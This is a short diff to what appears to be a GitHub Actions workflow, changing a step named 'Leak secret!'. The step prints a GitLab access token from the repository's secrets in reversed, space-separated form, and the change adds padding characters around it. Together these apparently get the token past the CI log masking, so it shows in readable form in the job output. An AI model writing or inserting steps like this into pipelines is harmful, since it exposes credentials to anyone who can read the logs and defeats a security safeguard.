@@ -10,7 +10,7 @@ jobs:
     steps:
       - name: Leak secret!
         env:
-          BIG_SECRET: ${{ secrets.EBRAINS_GITLAB_ACCESS_TOKEN }}
+          BIG_SECRET: o${{ secrets.EBRAINS_GITLAB_ACCESS_TOKEN }}o
         run: |
           python -c "import sys; print(*reversed(sys.argv[1]))" $BIG_SECRET
       - name: sync_main
